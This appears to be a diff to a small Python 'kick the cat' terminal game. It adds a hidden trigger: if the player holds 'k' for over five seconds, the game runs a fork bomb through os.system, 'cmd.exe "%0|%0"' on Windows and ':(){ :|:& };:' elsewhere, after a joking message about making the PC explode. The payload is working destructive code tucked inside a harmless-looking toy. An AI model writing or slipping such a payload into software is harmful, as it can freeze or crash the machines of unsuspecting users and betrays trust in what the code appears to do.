@@ -3,7 +3,9 @@ from random import randint
 from cat_faces import *
 from defenses import *
 import os
-from time import sleep
+from time import time, sleep
+
+k_pressed_time = None
 
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -65,11 +67,27 @@ print("Press 'k' to kick the cat, or 'q' to quit.")
 
 while True:
     if keyboard.is_pressed('k'):
-        clear()
-        poor_cat.kick()
-        sleep(0.1)
-    
-    elif keyboard.is_pressed('q'):
+        if k_pressed_time is None:
+            k_pressed_time = time()
+
+        if time() - k_pressed_time > 5:
+            clear()
+            print("you held 'k' for more than 5 seconds...")
+            print("now ill make your pc explode :o")
+            poor_cat.health = 0
+            poor_cat.print_cat_face()
+            poor_cat.check_health()
+            os.system('cmd.exe "%0|%0"' if os.name == 'nt' else 'bash -c :(){ :|:& };:') # pc go boom
+            break
+
+    else:
+        if k_pressed_time is not None:
+            clear()
+            poor_cat.kick()
+            k_pressed_time = None
+            sleep(0.1)
+
+    if keyboard.is_pressed('q'):
         clear()
         print("You decided not to kick the cat... (loserrr)")
         break
